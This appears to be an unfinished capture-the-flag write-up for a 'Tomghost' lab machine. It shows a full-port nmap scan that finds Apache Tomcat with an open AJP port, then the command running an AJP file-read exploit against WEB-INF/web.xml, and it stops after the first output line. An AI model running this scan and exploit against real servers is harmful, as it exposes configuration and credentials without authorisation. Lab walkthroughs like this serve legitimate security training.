# Tomghost

Starting with basic recon:
```sh
nmap -sV $ip -p-
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-15 08:19 CEST
Nmap scan report for 10.10.46.67
Host is up (0.078s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We got a few services running but I can instantly see an application running on Port `8080` named Tomcat. <br/>
So I would just make a quick browser search for known exploits.






Using the exploit:
```sh
python2 exploit.py 10.10.46.67 -p 8009 -f WEB-INF/web.xml
Getting resource at ajp13://10.10.46.67:8009/asdf
